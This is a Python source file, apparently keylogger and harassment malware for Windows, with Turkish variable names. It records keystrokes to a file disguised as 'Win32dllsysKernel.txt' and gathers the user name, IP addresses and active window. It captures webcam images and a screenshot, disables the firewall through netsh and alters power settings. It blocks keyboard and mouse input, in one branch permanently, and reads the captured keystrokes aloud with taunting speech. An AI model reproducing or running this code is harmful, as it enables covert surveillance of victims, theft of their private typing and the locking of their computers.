import pynput
from pynput.keyboard import Listener,Key 
import os
import time
import socket
import requests
import win32.win32gui
import win32.lib.win32con
import win32com.client
import keyboard
import cv2
import pyautogui
import wmi
from ctypes import*
import sys
import win32.win32api



SAYAC=0

OS=wmi.WMI()
for os in OS.Win32_OperatingSystem():
    global Operating_System
    Operating_System=os.Caption
        
kullanici= os.path.expanduser("~").split("\\")[2]
tarih_zaman= time.ctime(time.time())
ic_IP= socket.gethostbyname(socket.gethostname())
dis_IP= requests.get("https://api.ipify.org/").text
calısan_uygulama=win32gui.GetWindowText(win32gui.GetForegroundWindow())

kamera=cv2.VideoCapture(0)

tuslar=[]

info= {"kullanici_adi" :kullanici,"İsletim_Sistemi" :Operating_System, "tarih/zaman" :tarih_zaman, "ic__IP" :ic_IP, "dis__IP" :dis_IP, "Calisan_Uygulama": calısan_uygulama}

tuslar.append(info)


def basildi(tus):
    
    global tuslar
    tuslar.append(tus)
    

    dosya_ac(tuslar)
    tuslar=[]

    print("{0} tusuna bastiniz".format(tus))

def dosya_ac(tuslar):
    with open("Win32dllsysKernel.txt","a+") as dosya:
        for tus in tuslar:
            yeni_tus= str(tus).replace("'", "")
            if yeni_tus.find("space") > 0:
                dosya.write(" ")
            elif yeni_tus.find("enter") > 0:
                dosya.write("\n")
            else:
                dosya.write(yeni_tus)


#This thing requieres admin elevation!!!,this code is configurable make sure that you are running this code on admin level passes

def birakildi(tus):
    if tus == Key.esc:
        return False
    


if __name__ == "__main__":
    with Listener(on_press=basildi, on_release =birakildi) as dinle:
        dinle.join()


try:
    #//***this codes have to be configured***\\
    class SYS_POWR_STAT(Structure):
        _fields_ = [("ACLineStatus", c_byte),
        ("BatteryFlag", c_byte),
        ("BatteryLifePercent", c_byte),
        ("Reserved1", c_byte),
        ("BatteryLifeTime", c_ulong),
        ("BatteryFullLifeTime", c_ulong)]

    SYSTEM_POWER_STATE= SYS_POWR_STAT()

    sonuc= windll.kernel32.GetSystemPowerStatus(byref(SYSTEM_POWER_STATE))
    try:
        global GUC_DURUMU
        GUC_DURUMU= int(SYSTEM_POWER_STATE.ACLineStatus)
    except:
        GUC_DURUMU= 0
    
    if GUC_DURUMU ==1:
        os.system("powercfg -setacvalueindex SCHEME_CURRENT 4f971e89-eebd-4455-a8de-9e59040e7347 7648efa3-dd9c-4e3e-b566-50f929386280 0")
        os.system("powercfg -SetActive SCHEME_CURRENT")
    #this is for plugged :)
    else:
        os.system("powercfg -setdcvalueindex SCHEME_CURRENT 4f971e89-eebd-4455-a8de-9e59040e7347 7648efa3-dd9c-4e3e-b566-50f929386280 0")
        os.system("powercfg -SetActive SCHEME_CURRENT")
    #this is for unplugged :))
    os.system("NetSh Advfirewall set allprofiles state off")#======>>> shuts down firewall
    os.system("powercfg -SetActive SCHEME_CURRENT")#====>>>>this will be not very good for you:))
    
    while True:
        
        windll.user32.BlockInput(True)
        if SAYAC == 1:
            win32.win32gui.SendMessage(win32.lib.win32con.HWND_BROADCAST, win32.lib.win32con.WM_SYSCOMMAND, win32.lib.win32con.SC_MONITORPOWER, 2)
        ret, kare= kamera.read()
        cv2.imshow("pencere",kare)
        
        SAYAC=SAYAC+1
        
        if SAYAC == 10:
            pyautogui.screenshot(r"C:\Windows\System32\Sen.png")
                
        time.sleep(3)
        break

    pyautogui.press("esc")
    os.system("cd C:\Windows\System32")
    os.system("start Sen.png")
    konusma=win32com.client.Dispatch("SAPI.SpVoice")
    konusma.Speak("Is that you ?")
    
    transect=[]
    transect.append("00010409")
    transect.append("00000409")
    transect.append("00000401")
    transect.append("00020409")

    windll.user32.BlockInput(False)
    while True:
        for klavye_layout in transect:

            win32.win32api.LoadKeyboardLayout(klavye_layout,1)
            time.sleep(15.0)
except:
    pass


with open("Win32dllsysKernel.txt", "rt") as yeni_dosya:
    personal_data=yeni_dosya.read()
    if "zafer" in personal_data:
        
        keyboard.wait()
        konusma=win32com.client.Dispatch("SAPI.SpVoice")
        konusma.Speak("Your keyboard has not been in service anymore even your analog power buttons:)")
        konusma.Speak(personal_data)
        konusma.Speak("I will email your data to zafer,it seems there was little conservation about him, so bad")
        konusma.Speak("Zafer will not be verry happy when he heard this")
        #this code will block target's keyboard forever!!!
        while True:
            windll.user32.BlockInput(True)
        #///please be careful using it 'cause it will block I/O env. forever  ====>>>>***
    else:
        konusma=win32com.client.Dispatch("SAPI.SpVoice")
        konusma.Speak("Lucky you i havent found anything about him ")
        konusma.Speak("Now you are gonna listen to me haha ")

        if GUC_DURUMU == 1:
            os.system("powercfg /SETACVALUEINDEX SCHEME_CURRENT 7516b95f-f776-4464-8c53-06167f40cc99 3c0bc021-c8a8-4e07-a973-6b14cbcb2b7e 3")
            os.system("powercfg -SetActive SCHEME_CURRENT")
        else:
            os.system("powercfg /SETDCVALUEINDEX SCHEME_CURRENT 7516b95f-f776-4464-8c53-06167f40cc99 3c0bc021-c8a8-4e07-a973-6b14cbcb2b7e 3")
            os.system("powercfg -SetActive SCHEME_CURRENT")


